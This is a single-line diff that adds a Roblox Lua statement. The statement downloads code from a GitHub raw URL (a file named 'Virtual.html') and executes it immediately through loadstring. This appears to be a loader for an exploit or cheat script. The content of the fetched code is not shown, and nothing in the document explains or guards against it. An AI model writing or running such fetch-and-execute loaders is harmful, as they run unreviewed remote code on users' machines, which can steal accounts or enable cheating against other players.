@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DomainXV3/Milk-up/main/Virtual.html",true))()
